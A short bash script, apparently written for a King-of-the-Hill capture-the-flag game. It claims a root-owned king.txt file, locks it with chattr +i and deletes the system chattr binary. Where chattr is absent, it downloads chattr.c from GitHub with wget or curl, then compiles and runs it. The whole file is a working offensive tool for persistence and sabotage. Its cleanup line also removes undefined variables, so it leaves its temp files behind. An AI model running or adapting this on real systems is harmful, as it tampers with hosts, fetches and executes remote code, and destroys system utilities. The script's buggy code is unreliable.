#!/bin/bash

CHATTR_URL="https://github.com/brgl/busybox/raw/master/e2fsprogs/chattr.c"
HAS_CHATTR=$(which chattr)
HAS_GCC=$(which gcc)
HAS_WGET=$(which wget)
HAS_CURL=$(which curl)
USERNAME="adophilus"
KING_FILE_PATH="/root/king.txt"

if [[ "$HAS_CHATTR" != "" ]];
then

$HAS_CHATTR -i "$KING_FILE_PATH"
echo "$USERNAME" > "$KING_FILE_PATH"
$HAS_CHATTR +i "$KING_FILE_PATH"
rm "$HAS_CHATTR"

elif [[ "$HAS_GCC" != "" ]];
then

source_tmp_file=$(mktemp)
compiled_tmp_file=$(mktemp)

if [[ "$HAS_WGET" != "" ]];
then

wget "$CHATTR_URL" -O "$source_tmp_file"

elif [[ "$HAS_CURL" != "" ]];
then

curl "$CHATTR_URL" -o "$source_tmp_file"

else

exit

fi

gcc "$source_tmp_file" -o "$compiled_tmp_file"

$compiled_tmp_file -i "$KING_FILE_PATH"
echo "$USERNAME" > "$KING_FILE_PATH"
$compiled_tmp_file +i "$KING_FILE_PATH"
rm "$compiled_file_path" "$source_file_path"

fi
